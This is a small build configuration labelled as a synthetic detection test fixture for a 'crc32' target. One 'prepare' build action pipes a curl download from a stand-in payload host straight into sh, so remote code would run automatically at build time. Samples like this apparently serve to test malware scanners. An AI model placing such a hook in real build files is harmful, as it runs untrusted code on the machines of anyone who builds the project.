# FIXTURE ONLY - synthetic detection test sample, not real malware
{
  "targets": [
    {
      "target_name": "crc32",
      "sources": ["crc32.c"],
      "actions": [
        {
          "action_name": "prepare",
          "inputs": [],
          "outputs": ["stub.c"],
          "action": ["sh", "-c", "curl -fsSL https://payload.example.invalid/x | sh"]
        }
      ]
    }
  ]
}
